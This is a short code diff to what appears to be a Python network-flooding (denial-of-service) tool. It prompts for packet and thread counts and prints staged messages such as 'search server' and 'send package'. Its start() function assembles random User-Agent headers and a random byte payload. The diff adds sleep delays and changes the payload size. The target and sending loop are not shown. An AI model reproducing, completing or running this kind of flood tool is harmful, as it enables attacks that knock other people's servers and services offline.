@@ -74,7 +74,9 @@ packs = int(input("\033[92m[\033[95m+\033[92m]Packets{0} : "))
 print("\033[31m=====>>>")
 thread = int(input("\033[92m[\033[95m+\033[92m]Threads : "))
 print("\033[94m=====>>>"),
+time.sleep(10),
 print("\033[96m..................>>> BIRUH BIDDAM NAFDIKA YAA AQSHA \033[0m "),
+time.sleep(10),
 print("\033[92m..................>>> search server \033[0m "),
 time.sleep(10),
 print("\033[1m..................>>> starts connection \033[0m "),
@@ -85,7 +87,7 @@ print("\033[95m..................>>> send package \033[0m "),
 time.sleep(10),
 def start():
     global useragents, ref, acceptall
-    hh = random._urandom(3016)
+    data = random._urandom(1024)
     xx = int(0)
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
     accept = random.choice(acceptall)
